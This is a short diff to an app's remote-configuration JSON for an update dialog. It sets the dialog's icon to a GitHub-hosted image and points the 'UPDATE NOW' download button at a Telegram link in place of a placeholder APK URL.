@@ -1,10 +1,10 @@
 {
   "show_update_dialog": true,
   "title": "VIP UPDATE REQUIRED",
-  "icon_url": "",
+  "icon_url": "https://raw.githubusercontent.com/mdarif76769/mdarif76769.github.io/refs/heads/main/firebase_controller/pro.png",
   "changelog": "• Important security patch and fixes.\n• Please update to continue using the app.",
   "btn_text": "UPDATE NOW ★",
-  "download_url": "https://example.com/app-release.apk",
+  "download_url": "https://t.me/RS5ARIF",
   "show_update_btn": true,
   "show_cancel_btn": true,
   "theme_colors": {
